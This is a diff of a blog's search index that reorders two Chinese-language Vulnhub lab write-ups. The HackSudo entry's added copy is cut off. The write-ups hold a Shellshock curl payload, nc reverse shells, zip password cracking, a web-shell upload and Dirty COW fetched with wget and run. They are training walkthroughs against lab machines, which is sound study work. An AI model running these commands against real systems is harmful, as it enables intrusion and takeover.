@@ -213,121 +213,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HackSudo</title>
-    <url>/2021/11/06/hacksudo/index/</url>
-    <content><![CDATA[<h1 id="HackSudo"><a href="#HackSudo" class="headerlink" title="HackSudo"></a>HackSudo</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p><code>目标介绍</code> ：Debian Linux （目标是个网上在线银行系统）</p>
-<p><code>攻击主机</code> ： kali Linux</p>
-<hr>
-<p><code>利用技术</code>：</p>
-<p>-shellshock破壳漏洞&lt;–cgi-bin–&gt;</p>
-<p>-GTFOBins提权</p>
-<p>-github开源源码泄露</p>
-<h2 id="打靶开始"><a href="#打靶开始" class="headerlink" title="打靶开始"></a>打靶开始</h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><p><code>（偷个懒直接上命令了）</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.102	08:00:27:c5:88:8d	PCS Systemtechnik GmbH</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nmap -p- -sC -sV 192.168.0.102</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-30 02:53 EDT</span><br><span class="line">Nmap scan report for localhost (192.168.0.102)</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 37:36:60:3e:26:ae:23:3f:e1:8b:5d:18:e7:a7:c7:ce (RSA)</span><br><span class="line">|   256 34:9a:57:60:7d:66:70:d5:b5:ff:47:96:e0:36:23:75 (ECDSA)</span><br><span class="line">|_  256 ae:7d:ee:fe:1d:bc:99:4d:54:45:3d:61:16:f8:6c:87 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
-
-<p>目标的IP是 <code>192.168.0.102</code> 开放的服务有<code>80</code> <code>22</code>端口</p>
-<hr>
-<p>目标的基本信息已经明确，下一步就是对目标进行更深层的信息收集，以便得到更深层的信息，方便后期的漏洞利用</p>
-<p>使用工具<code>dirsearch</code>可以挖掘到目标的存在页面</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(yifang㉿yifang)-[~]</span><br><span class="line">└─$ dirsearch -u http://192.168.0.102/</span><br><span class="line"></span><br><span class="line">[02:59:56] 403 -  278B  - /cgi-bin/</span><br><span class="line">[03:01:17] 200 -    4KB - /README.md</span><br><span class="line">[03:01:19] 200 -    1KB - /admin_login.php</span><br><span class="line">[03:01:21] 200 -    4KB - /contact.php</span><br><span class="line">[03:01:23] 200 -  472B  - /header.php</span><br><span class="line">[03:01:23] 200 -    5KB - /home.php</span><br><span class="line">[03:01:23] 200 -    4KB - /images/</span><br><span class="line">[03:01:23] 200 -    5KB - /index.php</span><br><span class="line">[03:01:23] 200 -    5KB - /index.php/login/</span><br><span class="line">[03:01:25] 200 -    8KB - /news.php</span><br></pre></td></tr></table></figure>
-
-<p>在进一步查看只会发现有价值的信息就是admin_login.php，这个是管理员的登录地址。还有比较有意思的就是README.md文件</p>
-<hr>
-<h3 id="2-源码泄露"><a href="#2-源码泄露" class="headerlink" title="2.源码泄露"></a>2.源码泄露</h3><p>README.md文件中有一些提示<img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071254304.png" alt="git"></p>
-<p>剩下的操作岂不是信手拈来？直接在后台页面登录</p>
-<p>可以登录后台，但是在一番尝试后，发现并没有任何*用，于是尝试寻找其他漏洞</p>
-<h3 id="3-shellshock漏洞"><a href="#3-shellshock漏洞" class="headerlink" title="3.shellshock漏洞"></a>3.shellshock漏洞</h3><p>在信息收集的时候发现了cgi-bin的目录，有这个目录也就以为着可能存在<code>shellshock</code>[破壳漏洞]，在扫描的时候，反馈的是<code>403</code>状态，但是并不代表底下的文件不能被访问，于是尝试使用<code>dirsearch</code>进行暴力破解</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(yifang㉿yifang)-[~]</span><br><span class="line">└─$ dirsearch -u http://192.168.0.102/cgi-bin/  -f -e sh,cgi </span><br><span class="line">[03:11:41] Starting: </span><br><span class="line">[03:11:56] 500 -  611B  - /cgi-bin/backup.cgi</span><br><span class="line">[03:12:11] 500 -  611B  - /cgi-bin/shell.sh</span><br><span class="line">[03:12:11] 500 -  650B  - /cgi-bin/shell.sh/</span><br></pre></td></tr></table></figure>
-
-<p>果然存在两个文件，如果这个两个文件如果存在漏洞的话，那么就可以直接调用操作系统的<code>Bash</code>[需要当前操作系统bash存在漏洞]</p>
-<h3 id="4-边境突破"><a href="#4-边境突破" class="headerlink" title="4.边境突破"></a>4.边境突破</h3><p>nmap正好集成了这一类漏洞的POC，可以来试试</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/backup.cgi,cmd=ls 192.168.0.102</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">| http-shellshock: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   HTTP Shellshock vulnerability</span><br><span class="line">|     State: VULNERABLE (Exploitable)</span><br><span class="line">|     IDs:  CVE:CVE-2014-6271</span><br><span class="line">|       This web application might be affected by the vulnerability known</span><br><span class="line">|       as Shellshock. It seems the server is executing commands injected</span><br><span class="line">|       via malicious HTTP headers.</span><br></pre></td></tr></table></figure>
-
-<p>nmap已经爆出了CVE编号，百度搜索一波<code>CVE-2014-6271</code> </p>
-<p>可以参考一下以下文章</p>
-<hr>
-<p>接下来就是漏洞利用</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H &quot;user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c &#x27;nc -e /bin/bash 192.168.0.103 4444&#x27;&quot; http://192.168.0.103/cgi-bin/backup.cgi</span><br></pre></td></tr></table></figure>
-
-<p>Kali端</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
-
-<p>成功接收到shell</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071255222.png" alt="nc"></p>
-<h3 id="5-权限提升"><a href="#5-权限提升" class="headerlink" title="5.权限提升"></a>5.权限提升</h3><p>得到了目标的www用户的shell，这个权限是很低的，因此要继续寻找其他漏洞，以供获取更高的权限</p>
-<p>首先老传统，先升级nc的shell，<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
-<p>然后，<code>sudo -l</code>命令寻找可以免密码运行的程序</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071255887.png" alt="sudo"></p>
-<p>看到这里，当然是想去运行一下这个文件到底是干什么的</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u thor  /home/thor/./hammer.sh</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071255159.png" alt="thor"></p>
-<p>以<code>thor</code>身份运行<code>hammer.sh</code>文件，发现可以执行操作系统命令，直接执行<code>nc -e /bin/bash 192.168.0.103 5555</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071255960.png" alt="thorshell"></p>
-<p>然后使用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; &amp;&amp; sudo -l</code>寻找能够提权的方法,发现<code>thor</code>用户拥有执行service命令SUDO权力，在</p>
-<p>在该网站，寻找service的提权方式</p>
-<p><code>sudo service ../../bin/sh</code></p>
-<p>提权成功</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071256543.png" alt="root"></p>
-<p>打靶结束！！！</p>
-]]></content>
-      <categories>
-        <category>Vulnhub</category>
-      </categories>
-      <tags>
-        <tag>Vulnhub-Easy</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DRIFTINGBLUES:6</title>
-    <url>/2021/11/06/britfblue6/index/</url>
-    <content><![CDATA[<h1 id="DRIFTINGBLUES-6"><a href="#DRIFTINGBLUES-6" class="headerlink" title="DRIFTINGBLUES: 6"></a>DRIFTINGBLUES: 6</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><h5 id="下载地址：https-download-vulnhub-com-driftingblues-driftingblues6-vh-ova"><a href="#下载地址：https-download-vulnhub-com-driftingblues-driftingblues6-vh-ova" class="headerlink" title="下载地址：https://download.vulnhub.com/driftingblues/driftingblues6_vh.ova"></a>下载地址：<a href="https://download.vulnhub.com/driftingblues/driftingblues6_vh.ova">https://download.vulnhub.com/driftingblues/driftingblues6_vh.ova</a></h5><h5 id="难度：Easy"><a href="#难度：Easy" class="headerlink" title="难度：Easy"></a>难度：Easy</h5><h5 id="运行环境：VirtualBox"><a href="#运行环境：VirtualBox" class="headerlink" title="运行环境：VirtualBox"></a>运行环境：VirtualBox</h5><hr>
-<p>攻击主机：kali 2021</p>
-<p>目标主机：DRIFTINGBLUES: 6</p>
-<h2 id="打靶开始"><a href="#打靶开始" class="headerlink" title="打靶开始"></a>打靶开始</h2><h4 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h4><p>使用ARP扫描可以快速的发现当前网段所有的开启主机</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071302784.png" alt="arpscan"></p>
-<h4 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h4><p>还是老套路</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -p- 192.168.0.104 </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-10 02:06 EDT</span><br><span class="line">Nmap scan report for 192.168.0.104</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/textpattern/textpattern</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-title: driftingblues</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071302511.png" alt="nmap"></p>
-<h4 id="3-信息收集"><a href="#3-信息收集" class="headerlink" title="3.信息收集"></a>3.信息收集</h4><p>使用浏览器访问目标WEB站点，得到了一串提示</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /textpattern/textpattern</span><br><span class="line">dont forget to add .zip extension to your dir-brute</span><br><span class="line">;)</span><br></pre></td></tr></table></figure>
-
-<p>访问该路径得到一个登录地址，另一段提示应该是一个zip文件，应该保存了一些密码之类的····</p>
-<p>使用dirb工具进行爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.0.104/ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -X .zip</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071302288.png" alt="dirb"></p>
-<hr>
-<p>再次进行目录爆破，我比较习惯用<code>dirsearch</code> </p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(yifang㉿yifang)-[~]</span><br><span class="line">└─$ dirsearch -u http://192.168.0.104/ -i 200</span><br><span class="line">[02:36:29] 200 -   52KB - /db</span><br><span class="line">[02:36:30] 200 -  750B  - /index</span><br><span class="line">[02:36:30] 200 -  750B  - /index.html</span><br><span class="line">[02:36:33] 200 -  110B  - /robots.txt</span><br><span class="line">[02:36:35] 200 -   12KB - /textpattern/</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">┌──(yifang㉿yifang)-[~]</span><br><span class="line">└─$ dirsearch -u http://192.168.0.104/textpattern/textpattern/ -i 200</span><br><span class="line">[02:45:38] 200 -    0B  - /textpattern/textpattern/config.php</span><br><span class="line">[02:45:40] 200 -    5KB - /textpattern/textpattern/include/</span><br><span class="line">[02:45:40] 200 -    4KB - /textpattern/textpattern/index.php</span><br><span class="line">[02:45:40] 200 -    4KB - /textpattern/textpattern/index.php/login/</span><br><span class="line">[02:45:41] 200 -    6KB - /textpattern/textpattern/lib/</span><br><span class="line">[02:45:43] 200 -  784B  - /textpattern/textpattern/plugins/</span><br><span class="line">[02:45:43] 200 -    2KB - /textpattern/textpattern/publish/</span><br><span class="line">[02:45:44] 200 -    3KB - /textpattern/textpattern/setup/</span><br><span class="line">[02:45:45] 200 -  776B  - /textpattern/textpattern/tmp/</span><br><span class="line">[02:45:46] 200 -    2KB - /textpattern/textpattern/vendors/</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">┌──(yifang㉿yifang)-[~]</span><br><span class="line">└─$ dirsearch -u http://192.168.0.104/textpattern/ -i 200</span><br><span class="line">[02:46:59] 200 -   66KB - /textpattern/HISTORY</span><br><span class="line">[02:46:59] 200 -   66KB - /textpattern/HISTORY.txt</span><br><span class="line">[02:46:59] 200 -   15KB - /textpattern/LICENSE.txt</span><br><span class="line">[02:47:00] 200 -   15KB - /textpattern/LICENSE</span><br><span class="line">[02:47:00] 200 -    6KB - /textpattern/README</span><br><span class="line">[02:47:00] 200 -    6KB - /textpattern/README.txt</span><br><span class="line">[02:47:04] 200 -    0B  - /textpattern/css.php</span><br><span class="line">[02:47:05] 200 -  944B  - /textpattern/files/</span><br><span class="line">[02:47:06] 200 -  746B  - /textpattern/images/</span><br><span class="line">[02:47:06] 200 -   12KB - /textpattern/index.php</span><br><span class="line">[02:47:10] 200 -    4KB - /textpattern/textpattern/</span><br><span class="line">[02:47:10] 200 -  746B  - /textpattern/themes/</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-离线口令爆破"><a href="#4-离线口令爆破" class="headerlink" title="4.离线口令爆破"></a>4.离线口令爆破</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(yifang㉿yifang)-[~]</span><br><span class="line">└─$ zip2john spammer.zip &gt; passwd  #先生成zip的哈希散列</span><br><span class="line">ver 2.0 spammer.zip/creds.txt PKZIP Encr: cmplen=27, decmplen=15, crc=B003611D</span><br><span class="line">┌──(yifang㉿yifang)-[~]</span><br><span class="line">└─$ john passwd --show #注意这里需要加一个show</span><br><span class="line">spammer.zip/creds.txt:myspace4:creds.txt:spammer.zip::spammer.zip</span><br><span class="line">1 password hash cracked, 0 left</span><br><span class="line">┌──(yifang㉿yifang)-[~]</span><br><span class="line">└─$ unzip spammer.zip  #进行zip解压</span><br><span class="line">Archive:  spammer.zip</span><br><span class="line">[spammer.zip] creds.txt password: </span><br><span class="line"> extracting: creds.txt               </span><br><span class="line">┌──(yifang㉿yifang)-[~]</span><br><span class="line">└─$ cat creds.txt </span><br><span class="line">mayer:lionheart</span><br><span class="line">---------------------------------</span><br><span class="line">账户：mayer</span><br><span class="line">密码：lionheart</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071305297.png" alt="john"></p>
-<h4 id="5-文件上传Getshell"><a href="#5-文件上传Getshell" class="headerlink" title="5.文件上传Getshell"></a>5.文件上传Getshell</h4><p>登录后台，进入【Content】-&gt;【Files】下，进行文件上传，令人兴奋的是，这里可以上传任何文件，</p>
-<p>而路径就在<a href="http://192.168.0.104/textpattern/files/shell.php">http://192.168.0.104/textpattern/files/shell.php</a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071302501.png" alt="admin"></p>
-<p>蚁剑连接成功</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071303870.png" alt="antsword"></p>
-<h4 id="6-后渗透提权"><a href="#6-后渗透提权" class="headerlink" title="6.后渗透提权"></a>6.后渗透提权</h4><p>首先进行nc转移shell，目标的nc似乎存在-e的功能</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">目标主机：nc -e /bin/shell 192.168.0.103 4444</span><br><span class="line">kali：nc -lvp 4444</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071303159.png" alt="nc"></p>
-<p>在尝试了两种提权方式 <code>sudoers</code> <code>SUID</code> 并没有找到有用的文件，尝试使用 <code>脏牛</code> 进行提权操作</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/40839.c .</span><br><span class="line">python3 -m http.server</span><br><span class="line">-----------------------------------------------</span><br><span class="line">目标主机:</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.0.103:8000/40839.c</span><br><span class="line">gcc -pthread 40839.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">重新连接ncshell</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">su firefart</span><br><span class="line">id</span><br><span class="line">cat /root/flag.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071303831.png" alt="getshell"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071303366.png" alt="flag"></p>
-]]></content>
-      <categories>
-        <category>Vulnhub</category>
-      </categories>
-      <tags>
-        <tag>Vulnhub-Easy</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hard-Socnet2</title>
     <url>/2021/11/06/hardsocnet2/index/</url>
     <content><![CDATA[<h1 id="Vulnhub靶机打靶-hard-socnet2"><a href="#Vulnhub靶机打靶-hard-socnet2" class="headerlink" title="Vulnhub靶机打靶-hard-socnet2"></a>Vulnhub靶机打靶-hard-socnet2</h1><h2 id="靶机详情"><a href="#靶机详情" class="headerlink" title="靶机详情"></a>靶机详情</h2><p>难度：高</p>
@@ -411,6 +296,121 @@
       </categories>
       <tags>
         <tag>Vulnhub-Hard</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DRIFTINGBLUES:6</title>
+    <url>/2021/11/06/britfblue6/index/</url>
+    <content><![CDATA[<h1 id="DRIFTINGBLUES-6"><a href="#DRIFTINGBLUES-6" class="headerlink" title="DRIFTINGBLUES: 6"></a>DRIFTINGBLUES: 6</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><h5 id="下载地址：https-download-vulnhub-com-driftingblues-driftingblues6-vh-ova"><a href="#下载地址：https-download-vulnhub-com-driftingblues-driftingblues6-vh-ova" class="headerlink" title="下载地址：https://download.vulnhub.com/driftingblues/driftingblues6_vh.ova"></a>下载地址：<a href="https://download.vulnhub.com/driftingblues/driftingblues6_vh.ova">https://download.vulnhub.com/driftingblues/driftingblues6_vh.ova</a></h5><h5 id="难度：Easy"><a href="#难度：Easy" class="headerlink" title="难度：Easy"></a>难度：Easy</h5><h5 id="运行环境：VirtualBox"><a href="#运行环境：VirtualBox" class="headerlink" title="运行环境：VirtualBox"></a>运行环境：VirtualBox</h5><hr>
+<p>攻击主机：kali 2021</p>
+<p>目标主机：DRIFTINGBLUES: 6</p>
+<h2 id="打靶开始"><a href="#打靶开始" class="headerlink" title="打靶开始"></a>打靶开始</h2><h4 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h4><p>使用ARP扫描可以快速的发现当前网段所有的开启主机</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071302784.png" alt="arpscan"></p>
+<h4 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h4><p>还是老套路</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -p- 192.168.0.104 </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-10 02:06 EDT</span><br><span class="line">Nmap scan report for 192.168.0.104</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/textpattern/textpattern</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-title: driftingblues</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071302511.png" alt="nmap"></p>
+<h4 id="3-信息收集"><a href="#3-信息收集" class="headerlink" title="3.信息收集"></a>3.信息收集</h4><p>使用浏览器访问目标WEB站点，得到了一串提示</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /textpattern/textpattern</span><br><span class="line">dont forget to add .zip extension to your dir-brute</span><br><span class="line">;)</span><br></pre></td></tr></table></figure>
+
+<p>访问该路径得到一个登录地址，另一段提示应该是一个zip文件，应该保存了一些密码之类的····</p>
+<p>使用dirb工具进行爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.0.104/ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -X .zip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071302288.png" alt="dirb"></p>
+<hr>
+<p>再次进行目录爆破，我比较习惯用<code>dirsearch</code> </p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(yifang㉿yifang)-[~]</span><br><span class="line">└─$ dirsearch -u http://192.168.0.104/ -i 200</span><br><span class="line">[02:36:29] 200 -   52KB - /db</span><br><span class="line">[02:36:30] 200 -  750B  - /index</span><br><span class="line">[02:36:30] 200 -  750B  - /index.html</span><br><span class="line">[02:36:33] 200 -  110B  - /robots.txt</span><br><span class="line">[02:36:35] 200 -   12KB - /textpattern/</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">┌──(yifang㉿yifang)-[~]</span><br><span class="line">└─$ dirsearch -u http://192.168.0.104/textpattern/textpattern/ -i 200</span><br><span class="line">[02:45:38] 200 -    0B  - /textpattern/textpattern/config.php</span><br><span class="line">[02:45:40] 200 -    5KB - /textpattern/textpattern/include/</span><br><span class="line">[02:45:40] 200 -    4KB - /textpattern/textpattern/index.php</span><br><span class="line">[02:45:40] 200 -    4KB - /textpattern/textpattern/index.php/login/</span><br><span class="line">[02:45:41] 200 -    6KB - /textpattern/textpattern/lib/</span><br><span class="line">[02:45:43] 200 -  784B  - /textpattern/textpattern/plugins/</span><br><span class="line">[02:45:43] 200 -    2KB - /textpattern/textpattern/publish/</span><br><span class="line">[02:45:44] 200 -    3KB - /textpattern/textpattern/setup/</span><br><span class="line">[02:45:45] 200 -  776B  - /textpattern/textpattern/tmp/</span><br><span class="line">[02:45:46] 200 -    2KB - /textpattern/textpattern/vendors/</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">┌──(yifang㉿yifang)-[~]</span><br><span class="line">└─$ dirsearch -u http://192.168.0.104/textpattern/ -i 200</span><br><span class="line">[02:46:59] 200 -   66KB - /textpattern/HISTORY</span><br><span class="line">[02:46:59] 200 -   66KB - /textpattern/HISTORY.txt</span><br><span class="line">[02:46:59] 200 -   15KB - /textpattern/LICENSE.txt</span><br><span class="line">[02:47:00] 200 -   15KB - /textpattern/LICENSE</span><br><span class="line">[02:47:00] 200 -    6KB - /textpattern/README</span><br><span class="line">[02:47:00] 200 -    6KB - /textpattern/README.txt</span><br><span class="line">[02:47:04] 200 -    0B  - /textpattern/css.php</span><br><span class="line">[02:47:05] 200 -  944B  - /textpattern/files/</span><br><span class="line">[02:47:06] 200 -  746B  - /textpattern/images/</span><br><span class="line">[02:47:06] 200 -   12KB - /textpattern/index.php</span><br><span class="line">[02:47:10] 200 -    4KB - /textpattern/textpattern/</span><br><span class="line">[02:47:10] 200 -  746B  - /textpattern/themes/</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-离线口令爆破"><a href="#4-离线口令爆破" class="headerlink" title="4.离线口令爆破"></a>4.离线口令爆破</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(yifang㉿yifang)-[~]</span><br><span class="line">└─$ zip2john spammer.zip &gt; passwd  #先生成zip的哈希散列</span><br><span class="line">ver 2.0 spammer.zip/creds.txt PKZIP Encr: cmplen=27, decmplen=15, crc=B003611D</span><br><span class="line">┌──(yifang㉿yifang)-[~]</span><br><span class="line">└─$ john passwd --show #注意这里需要加一个show</span><br><span class="line">spammer.zip/creds.txt:myspace4:creds.txt:spammer.zip::spammer.zip</span><br><span class="line">1 password hash cracked, 0 left</span><br><span class="line">┌──(yifang㉿yifang)-[~]</span><br><span class="line">└─$ unzip spammer.zip  #进行zip解压</span><br><span class="line">Archive:  spammer.zip</span><br><span class="line">[spammer.zip] creds.txt password: </span><br><span class="line"> extracting: creds.txt               </span><br><span class="line">┌──(yifang㉿yifang)-[~]</span><br><span class="line">└─$ cat creds.txt </span><br><span class="line">mayer:lionheart</span><br><span class="line">---------------------------------</span><br><span class="line">账户：mayer</span><br><span class="line">密码：lionheart</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071305297.png" alt="john"></p>
+<h4 id="5-文件上传Getshell"><a href="#5-文件上传Getshell" class="headerlink" title="5.文件上传Getshell"></a>5.文件上传Getshell</h4><p>登录后台，进入【Content】-&gt;【Files】下，进行文件上传，令人兴奋的是，这里可以上传任何文件，</p>
+<p>而路径就在<a href="http://192.168.0.104/textpattern/files/shell.php">http://192.168.0.104/textpattern/files/shell.php</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071302501.png" alt="admin"></p>
+<p>蚁剑连接成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071303870.png" alt="antsword"></p>
+<h4 id="6-后渗透提权"><a href="#6-后渗透提权" class="headerlink" title="6.后渗透提权"></a>6.后渗透提权</h4><p>首先进行nc转移shell，目标的nc似乎存在-e的功能</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">目标主机：nc -e /bin/shell 192.168.0.103 4444</span><br><span class="line">kali：nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071303159.png" alt="nc"></p>
+<p>在尝试了两种提权方式 <code>sudoers</code> <code>SUID</code> 并没有找到有用的文件，尝试使用 <code>脏牛</code> 进行提权操作</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/40839.c .</span><br><span class="line">python3 -m http.server</span><br><span class="line">-----------------------------------------------</span><br><span class="line">目标主机:</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.0.103:8000/40839.c</span><br><span class="line">gcc -pthread 40839.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">重新连接ncshell</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">su firefart</span><br><span class="line">id</span><br><span class="line">cat /root/flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071303831.png" alt="getshell"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071303366.png" alt="flag"></p>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub-Easy</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackSudo</title>
+    <url>/2021/11/06/hacksudo/index/</url>
+    <content><![CDATA[<h1 id="HackSudo"><a href="#HackSudo" class="headerlink" title="HackSudo"></a>HackSudo</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p><code>目标介绍</code> ：Debian Linux （目标是个网上在线银行系统）</p>
+<p><code>攻击主机</code> ： kali Linux</p>
+<hr>
+<p><code>利用技术</code>：</p>
+<p>-shellshock破壳漏洞&lt;–cgi-bin–&gt;</p>
+<p>-GTFOBins提权</p>
+<p>-github开源源码泄露</p>
+<h2 id="打靶开始"><a href="#打靶开始" class="headerlink" title="打靶开始"></a>打靶开始</h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><p><code>（偷个懒直接上命令了）</code></p>
